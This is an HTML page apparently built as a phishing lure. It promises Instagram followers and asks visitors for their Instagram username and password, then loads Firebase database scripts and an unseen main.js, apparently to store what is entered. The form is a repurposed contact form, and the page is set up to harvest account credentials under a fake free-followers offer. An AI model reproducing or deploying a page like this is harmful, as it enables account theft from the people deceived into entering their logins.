  
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="style.css" />
    <title>Instagram Followers</title>
  </head>
  <body>


    <h1>Instagram Followers</h1>
    <p>Login to instagram</p>
    <p id="dis" style="color: lightgreen;font-weight: 30px; visibility: hidden;">Message has been sent</p>
    <form class="contact-form">
      <label for="">Userame</label><br />
      <input class="name" type="text" placeholder="Username" /><br />
      <label for="">Password</label><br />
      <input class="email" type="password" placeholder="Password" /><br />
      <label for="">No of followers</label><br />
      <input type="tel"
        class="message"
        name=""
        id=""
        cols="30"
        rows="8"
        placeholder="Followers count"
      ></input
      ><br />
      <button type="submit" id="submit">Next</button>
    </form>


    <script src="https://www.gstatic.com/firebasejs/8.0.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.0.2/firebase-analytics.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.0.2/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.0.2/firebase-analytics.js"></script>

    <script src="main.js"></script>
  </body>
</html>
